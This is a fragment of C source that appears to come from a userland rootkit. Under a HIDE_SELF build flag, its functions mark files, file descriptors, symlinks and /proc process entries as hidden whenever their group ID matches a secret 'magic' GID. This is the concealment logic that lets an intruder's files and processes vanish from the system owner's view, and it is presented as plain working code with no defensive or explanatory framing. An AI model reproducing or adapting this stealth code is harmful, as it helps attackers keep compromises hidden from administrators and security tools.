int _hidden_path(const char *pathname, short mode){
#ifndef HIDE_SELF
    return 0;
#else
    if(pathname == NULL)
        return 0;

    gid_t magicgid = readgid();
    switch(mode){
        case MODE_REG:
            if(get_path_gid(pathname) == magicgid)
                return 1;
            break;
        case MODE_64:
            if(get_path_gid64(pathname) == magicgid)
                return 1;
            break;
    }

    return 0;
#endif
}

int _f_hidden_path(int fd, short mode){
#ifndef HIDE_SELF
    return 0;
#else

    gid_t magicgid = readgid();
    switch(mode){
        case MODE_REG:
            if(get_fd_gid(fd) == magicgid)
                return 1;
            break;
        case MODE_64:
            if(get_fd_gid64(fd) == magicgid)
                return 1;
            break;
    }

    return 0;
#endif
}

int _l_hidden_path(const char *pathname, short mode){
#ifndef HIDE_SELF
    return 0;
#else
    if(pathname == NULL)
        return 0;

    gid_t magicgid = readgid();
    switch(mode){
        case MODE_REG:
            if(lget_path_gid(pathname) == magicgid)
                return 1;
            break;
        case MODE_64:
            if(lget_path_gid64(pathname) == magicgid)
                return 1;
            break;
    }

    return 0;
#endif
}

int hidden_proc(pid_t pid){
#ifndef HIDE_SELF
    return 0;
#else
    char proc_path[8 + PID_MAXLEN];
    snprintf(proc_path, sizeof(proc_path), "/proc/%d", pid);
    return _hidden_path(proc_path, MODE_REG);
#endif
}